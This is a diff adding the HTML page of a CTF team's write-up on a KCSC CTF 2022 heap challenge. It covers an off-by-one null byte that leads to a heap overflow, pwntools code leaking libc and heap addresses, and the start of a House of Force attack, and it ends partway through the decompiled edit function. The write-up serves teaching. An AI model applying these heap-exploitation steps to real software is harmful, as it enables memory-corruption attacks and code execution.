@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Numb3r">
+<meta name="description" content="Author: $hivmes Heap Adventure 0x01: House of force Needed : know the heap base address Need a heap overflow to overwrite the top_chunk size allocate arbitrary chunk size KCSC_CTF 2022: 5secretn0te When we start the bin, we have a menu :
+╔════════════════════════════════╗ ║ WELCOME TO KCSC ║ ╚════════════════════════════════┘ ╔══════════╗ ║██████████║ ║5ecretηΘ†E║ ║██████████║ ║██████████║ ║██████████║ ║██████████║ ╚══════════┘ [1] Create Page [2] Edit Page [3] Delete Page [4] Show Page [5] Quit &amp;gt;&amp;gt; As you can see, we can create, edit, delete and show a page When we create a chunk it ask for a username and a password :" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://subuthax.github.io/writeup/kcsc-house-of-force/" />
+
+
+    <title>
+        
+            KCSC House of Force :: Subuthax  — A CTF TEAM
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="KCSC House of Force">
+<meta itemprop="description" content="Author: $hivmes Heap Adventure 0x01: House of force Needed : know the heap base address Need a heap overflow to overwrite the top_chunk size allocate arbitrary chunk size KCSC_CTF 2022: 5secretn0te When we start the bin, we have a menu :
+╔════════════════════════════════╗ ║ WELCOME TO KCSC ║ ╚════════════════════════════════┘ ╔══════════╗ ║██████████║ ║5ecretηΘ†E║ ║██████████║ ║██████████║ ║██████████║ ║██████████║ ╚══════════┘ [1] Create Page [2] Edit Page [3] Delete Page [4] Show Page [5] Quit &gt;&gt; As you can see, we can create, edit, delete and show a page When we create a chunk it ask for a username and a password :"><meta itemprop="datePublished" content="2022-09-06T18:58:25+02:00" />
+<meta itemprop="dateModified" content="2022-09-06T18:58:25+02:00" />
+<meta itemprop="wordCount" content="2162"><meta itemprop="image" content="https://subuthax.github.io/"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://subuthax.github.io/"/>
+
+<meta name="twitter:title" content="KCSC House of Force"/>
+<meta name="twitter:description" content="Author: $hivmes Heap Adventure 0x01: House of force Needed : know the heap base address Need a heap overflow to overwrite the top_chunk size allocate arbitrary chunk size KCSC_CTF 2022: 5secretn0te When we start the bin, we have a menu :
+╔════════════════════════════════╗ ║ WELCOME TO KCSC ║ ╚════════════════════════════════┘ ╔══════════╗ ║██████████║ ║5ecretηΘ†E║ ║██████████║ ║██████████║ ║██████████║ ║██████████║ ╚══════════┘ [1] Create Page [2] Edit Page [3] Delete Page [4] Show Page [5] Quit &gt;&gt; As you can see, we can create, edit, delete and show a page When we create a chunk it ask for a username and a password :"/>
+
+
+
+    <meta property="og:title" content="KCSC House of Force" />
+<meta property="og:description" content="Author: $hivmes Heap Adventure 0x01: House of force Needed : know the heap base address Need a heap overflow to overwrite the top_chunk size allocate arbitrary chunk size KCSC_CTF 2022: 5secretn0te When we start the bin, we have a menu :
+╔════════════════════════════════╗ ║ WELCOME TO KCSC ║ ╚════════════════════════════════┘ ╔══════════╗ ║██████████║ ║5ecretηΘ†E║ ║██████████║ ║██████████║ ║██████████║ ║██████████║ ╚══════════┘ [1] Create Page [2] Edit Page [3] Delete Page [4] Show Page [5] Quit &gt;&gt; As you can see, we can create, edit, delete and show a page When we create a chunk it ask for a username and a password :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://subuthax.github.io/writeup/kcsc-house-of-force/" /><meta property="og:image" content="https://subuthax.github.io/"/><meta property="article:section" content="writeup" />
+<meta property="article:published_time" content="2022-09-06T18:58:25+02:00" />
+<meta property="article:modified_time" content="2022-09-06T18:58:25+02:00" /><meta property="og:site_name" content="Subuthax" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-09-06 18:58:25 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">subuthax</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/writeup">Write-Up</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://subuthax.github.io/writeup/kcsc-house-of-force/">KCSC House of Force</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <ul>
+<li>Author: $hivmes</li>
+</ul>
+<h1 id="heap-adventure-0x01-house-of-force">Heap Adventure 0x01: House of force</h1>
+<h1 id="needed-">Needed :</h1>
+<ul>
+<li>know the heap base address</li>
+<li>Need a heap overflow to overwrite the top_chunk size</li>
+<li>allocate arbitrary chunk size</li>
+</ul>
+<h1 id="kcsc_ctf-2022--5secretn0te">KCSC_CTF 2022:  5secretn0te</h1>
+<p>When we start the bin, we have a menu :</p>
+<pre tabindex="0"><code>╔════════════════════════════════╗
+║         WELCOME TO KCSC        ║
+╚════════════════════════════════┘
+	  ╔══════════╗
+	  ║██████████║
+	  ║5ecretηΘ†E║
+	  ║██████████║
+	  ║██████████║
+	  ║██████████║
+	  ║██████████║
+	  ╚══════════┘
+[1] Create Page
+[2] Edit Page
+[3] Delete Page
+[4] Show Page
+[5] Quit
+&gt;&gt;
+</code></pre><p>As you can see, we can create, edit, delete and show a page
+When we create a chunk it ask for a username and a password :</p>
+<pre tabindex="0"><code>Page no : 0
+Enter username: Shimves
+Enter password: 123456
+</code></pre><p>Note structure :</p>
+<pre tabindex="0"><code>0xdef280:	0x0000000000000000	0x0000000000000071 [0]
+0xdef290:	0x0a7365766d696853	0x0000000000000000  --+
+0xdef2a0:	0x0000000000000000	0x0000000000000000    |
+0xdef2b0:	0x0000000000000000	0x0000000000000000    +-- char name[80]
+0xdef2c0:	0x0000000000000000	0x0000000000000000    |
+0xdef2d0:	0x0000000000000000	0x0000000000000000  --+
+0xdef2e0:	0x0000000000000007	0x0000000000def270 [1][2]
+</code></pre><ol start="0">
+<li>The chunk header</li>
+<li>the password lenght</li>
+<li>a pointer to another chunk which contain de the password</li>
+</ol>
+<p>Chunk which hold the password is allocated before the chunk which hold the note</p>
+<h2 id="the-vulnerability">The vulnerability</h2>
+<p>The vulnerability reside in <strong>create()</strong> function which is called when we create a new page which to an  <em>heap overflow</em></p>
+<p>So what is happening ?</p>
+<p>Here is the stripped source code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> name [<span style="color:#ae81ff">80</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> passwd [<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//... random stuff
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Page no : %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)(uint)i);
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter username: &#34;</span>);
+</span></span><span style="display:flex;"><span>    fgets(name,<span style="color:#ae81ff">0x51</span>,stdin);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter password: &#34;</span>);
+</span></span><span style="display:flex;"><span>    fgets(passwd,<span style="color:#ae81ff">0x101</span>,stdin);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    size_dup <span style="color:#f92672">=</span> strlen(passwd);
+</span></span><span style="display:flex;"><span>    p_passwd <span style="color:#f92672">=</span> strdup(passwd);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p_note <span style="color:#f92672">=</span> (note <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">0x60</span>);
+</span></span><span style="display:flex;"><span>    table[i] <span style="color:#f92672">=</span> p_note;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	insert(name,size_dup,p_passwd,i);
+</span></span></code></pre></div><p>We have 2 buffers near each others and we :</p>
+<ul>
+<li>read 0x51 ( 81 ) bytes in the name buffer</li>
+<li>read 0x101 ( 257  ) bytes in the passwd buffer</li>
+</ul>
+<p>There is no bof because we use fgets and fgets is a safe function ? &hellip; right ? &hellip;.</p>
+<p>Well in fact there is a huge probleme, in C strings are null bytes terminated to know when the string end. functions like <strong>strlen</strong>, <strong>strcpy</strong> ( used by insert ) and <strong>strdup</strong> use the null byte to determine the size of the given string.<br>
+Refering to the man entry for fgets:</p>
+<pre tabindex="0"><code>fgets() reads in at most one less than _size_ characters from _stream_ and stores them into the buffer pointed to by _s_ 
+...
+A terminating null byte (aq\0aq) is stored after the last character in the buffer
+</code></pre><p>So fgets are going to read at most 80 bytes from stdin and use the last byte to store the null byte <strong>BUT</strong> this byte will overflow in the password buffer</p>
+<p>Lets me show you with gdb :</p>
+<pre tabindex="0"><code>pwndbg&gt; disass create
+   //skipped stuff
+   0x00000000004016eb &lt;+606&gt;:	call   0x4011a0 &lt;fgets@plt&gt;
+   0x00000000004016f0 &lt;+611&gt;:	lea    rdi,[rip+0x930]        # 0x402027
+   0x00000000004016f7 &lt;+618&gt;:	mov    eax,0x0
+   0x00000000004016fc &lt;+623&gt;:	call   0x401170 &lt;printf@plt&gt;
+   0x0000000000401701 &lt;+628&gt;:	mov    rdx,QWORD PTR [rip+0x2928]        # 0x404030 &lt;stdin@@GLIBC_2.2.5&gt;
+   0x0000000000401708 &lt;+635&gt;:	lea    rax,[rbp-0x110]
+   0x000000000040170f &lt;+642&gt;:	mov    esi,0x101
+   0x0000000000401714 &lt;+647&gt;:	mov    rdi,rax
+   0x0000000000401717 &lt;+650&gt;:	call   0x4011a0 &lt;fgets@plt&gt;
+</code></pre><p>Here is the calls to <strong>fgets</strong>, we put 2 breakpoints at <code>0x00000000004016eb &lt;+606&gt;:	call   0x4011a0 &lt;fgets@plt&gt;</code> and <code>0x0000000000401717 &lt;+650&gt;:	call   0x4011a0 &lt;fgets@plt&gt;</code></p>
+<h3 id="the-bug">The bug</h3>
+<pre tabindex="0"><code>► 0x4016eb &lt;create+606&gt;    call   fgets@plt                      &lt;fgets@plt&gt;
+        s: 0x7ffca6714990 ◂— 0x0
+        n: 0x51
+        stream: 0x7f8d0f7aa9e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
+</code></pre><p>We hit the first breakpoint and we see the buffer is locate at <strong>0x7ffca6714990</strong> on the stack (randomized because aslr is enabled)</p>
+<p>When we print the content of the buffer after executing the call, we get this:</p>
+<pre tabindex="0"><code>pwndbg&gt; x/10gx 0x7ffca6714990
+0x7ffca6714990:	0x4141414141414141	0x4141414141414141
+0x7ffca67149a0:	0x4141414141414141	0x4141414141414141
+0x7ffca67149b0:	0x4141414141414141	0x4141414141414141
+0x7ffca67149c0:	0x4141414141414141	0x4141414141414141
+0x7ffca67149d0:	0x4141414141414141	0x4141414141414141
+
+pwndbg&gt; p &amp;name
+$2 = (char (*)[80]) 0x7ffca6714990
+</code></pre><p>As you can see, we have sucessfully filled name buffer with 80 A + the null bytes</p>
+<p>Now lets look at the passwd buffer:</p>
+<pre tabindex="0"><code>pwndbg&gt; x/20gx 0x7ffca6714990
+				+------------------------------------------- char name[80]
+				|
+0x7ffca6714990:	0x4141414141414141	0x4141414141414141
+0x7ffca67149a0:	0x4141414141414141	0x4141414141414141
+0x7ffca67149b0:	0x4141414141414141	0x4141414141414141
+0x7ffca67149c0:	0x4141414141414141	0x4141414141414141
+0x7ffca67149d0:	0x4141414141414141	0x4141414141414141
+
+				+------------------------------------------ char passwd[256]
+				|
+0x7ffca67149e0:	0x0000000000000000	0x0000000000000000
+0x7ffca67149f0:	0x0000000000000000	0x0000000000000000
+0x7ffca6714a00:	0x0000000000000000	0x0000000000000000
+0x7ffca6714a10:	0x0000000000000000	0x0000000000000000
+0x7ffca6714a20:	0x0000000000000000	0x0000000000000000
+
+pwndbg&gt; p &amp;passwd
+$4 = (char (*)[256]) 0x7ffca67149e0
+</code></pre><p>But we have a probleme because remember the null bytes overflow on the passwd buffer.
+We can represent this is c like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> buffer[<span style="color:#ae81ff">80</span>] <span style="color:#f92672">==</span> passwd[<span style="color:#ae81ff">0</span>]
+</span></span></code></pre></div><p>So when we will read the password from stdin and store it in the buffer, the content will overwrite the null byte of the name string</p>
+<pre tabindex="0"><code> ► 0x401717 &lt;create+650&gt;    call   fgets@plt                      &lt;fgets@plt&gt;
+        s: 0x7ffca67149e0 ◂— 0x0
+        n: 0x101
+        stream: 0x7f8d0f7aa9e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
+</code></pre><p>After hiting the bp, step to the next instruction and lets inspect the content of password:</p>
+<pre tabindex="0"><code>				+------------------------------------------ char name[80]
+				|
+0x7ffca6714990:	0x4141414141414141	0x4141414141414141
+0x7ffca67149a0:	0x4141414141414141	0x4141414141414141
+0x7ffca67149b0:	0x4141414141414141	0x4141414141414141
+0x7ffca67149c0:	0x4141414141414141	0x4141414141414141
+0x7ffca67149d0:	0x4141414141414141	0x4141414141414141
+				+------------------------------------------ char passwd[256]
+				|
+0x7ffca67149e0:	0x4242424242424242	0x4343434343434343
+0x7ffca67149f0:	0x000000000000000a	0x0000000000000000
+0x7ffca6714a00:	0x0000000000000000	0x0000000000000000
+0x7ffca6714a10:	0x0000000000000000	0x0000000000000000
+0x7ffca6714a20:	0x0000000000000000	0x0000000000000000
+</code></pre><p>As you can see, there is no null ptr at the end of name, because it was overwritten by the password and now name is considered as name + password:</p>
+<pre tabindex="0"><code>pwndbg&gt; p (char *)name
+$9 = 0x7ffca6714990 &#39;A&#39; &lt;repeats 80 times&gt;, &#34;BBBBBBBBCCCCCCCC\n&#34;
+</code></pre><p>Then lets inspect the insert function</p>
+<h3 id="the-overflow">The overflow</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>int insert(char <span style="color:#f92672">*</span>name,longlong size,char <span style="color:#f92672">*</span>passwd,int idx)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  table[idx]<span style="color:#f92672">-&gt;</span>pwLen <span style="color:#f92672">=</span> size;
+</span></span><span style="display:flex;"><span>  table[idx]<span style="color:#f92672">-&gt;</span>passwd <span style="color:#f92672">=</span> passwd;
+</span></span><span style="display:flex;"><span>  strcpy(table[idx]<span style="color:#f92672">-&gt;</span>name,name);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Here is the <strong>inspect</strong> function, you can see it copy the name into the table which is an array of note structure which look something like this :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">80</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">long</span> pwnLen;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> passwd;
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">struct</span> note;
+</span></span></code></pre></div><p>Remember due to the bug, the name copied into this struct may be biffer than 80 so this lead to an overflow on the heap ( because note are allocated on the heap by create) and we can overwrite the passwd pointeur.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="leaking-libc-address">Leaking Libc address</h3>
+<p>Now we need to leak libc address, the only way is to use the show function :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>int show(void)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  uint uVar1;
+</span></span><span style="display:flex;"><span>  int idx;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Enter index: &#34;</span>);
+</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> read_int();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> (int)uVar1) <span style="color:#f92672">&amp;&amp;</span> ((int)uVar1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>)) <span style="color:#f92672">&amp;&amp;</span> (table[(int)uVar1] <span style="color:#f92672">!=</span> (note <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>)) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Page no : </span><span style="color:#e6db74">%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">username : </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)uVar1,table[(int)uVar1]);
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;pwLen : %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">password : </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,table[(int)uVar1]<span style="color:#f92672">-&gt;</span>pwLen,table[(int)uVar1]<span style="color:#f92672">-&gt;</span>passwd);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It print the password which is normaly our password allocated on the heap but imagine the passwd field contain the address of a linked function which reside in the got ?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/python</span>
+</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]) , <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;123456&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#LIBC</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Trigger the show function to leak libc address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34; [+] Leaking libc address&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;password : &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] @puts is at : </span><span style="color:#e6db74">{</span>hex(libc_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] libc base address is </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>We have sucessfully leaked the base address of libc, now lets leak the address of the heap.</p>
+<h2 id="leaking-heap-address">Leaking heap address</h2>
+<p>we have the <strong>table</strong> which can be usefull to leak heap address, table is defined like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">80</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">long</span> pwnLen;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> passwd;
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">struct</span> note;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>note <span style="color:#f92672">*</span> table[<span style="color:#ae81ff">10</span>];
+</span></span></code></pre></div><p>And <strong>table</strong> is a global array so it is stored in the data section which is static because there is no PIE, we can use the same process used for leaking libc to leak heap</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Heap</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># table is at 0x404040 in the data section</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34; [+] Leaking heap address&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reuse the bug to leak the heap address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x404040</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;123456&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;password : &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    heap_leak <span style="color:#f92672">=</span> u64(heap_leak <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> len(heap_leak)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] first note is at </span><span style="color:#e6db74">{</span>hex(heap_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><h2 id="house-of-force">House of force</h2>
+<p>The house of force vuln consist of overwriting the top_chunk size with an heap overflow to a big value, then allocation a huge chunk. After the chunk, the next chunk will be allocated at our desired value.
+With the command top_chunk we can print his address and his size. We can reuse the heap overflwo to overwrite his size field :</p>
+<pre tabindex="0"><code>Top chunk
+Addr: 0x62f420
+Size: 0xffffffffffffffff
+</code></pre><p>Here I have overwritten the size with the heap overflow and I have his address, so I just have to calculate the delta with our leaked chunk ( the first note).</p>
+<pre tabindex="0"><code>pwndbg&gt; print/x 0x62f420-0x62f290
+$2 = 0x190
+</code></pre><p>Now we need to allocate a chunk with the delta as size ( header included ) so lets look with edit function :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Enter index: &#34;</span>);
+</span></span><span style="display:flex;"><span>  idx_00 <span style="color:#f92672">=</span> read_int();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> idx_00) <span style="color:#f92672">&amp;&amp;</span> (idx_00 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>)) <span style="color:#f92672">&amp;&amp;</span> (table[idx_00] <span style="color:#f92672">!=</span> (note <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>)) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter username: &#34;</span>);
+</span></span><span style="display:flex;"><span>    fgets(name,<span style="color:#ae81ff">0x51</span>,stdin);
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter pwLen: &#34;</span>);
+</span></span><span style="display:flex;"><span>    __size <span style="color:#f92672">=</span> read_ll();
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter password: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">long</span>)__size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x101</span>) {
+</span></span><span style="display:flex;"><span>      fgets(passwd,<span style="color:#ae81ff">0x101</span>,stdin);
